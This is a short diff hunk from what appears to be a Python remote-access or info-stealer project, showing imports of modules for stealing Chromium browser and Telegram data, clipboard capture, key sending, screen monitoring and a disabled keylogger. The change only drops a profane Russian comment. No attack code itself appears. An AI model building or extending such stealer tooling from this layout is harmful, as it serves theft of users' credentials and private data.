@@ -33,7 +33,7 @@ from Core.Stealer.Chromium         import *
 from Core.Stealer.Telegram         import *
 
 from Core.Other.Clipboard          import *
-#from Core.Other.Keylogger          import * <-- эта хуйня не работает
+#from Core.Other.Keylogger          import *
 from Core.Other.SendKeys           import *
 from Core.Other.Monitor            import *
 from Core.Other.Volume             import *
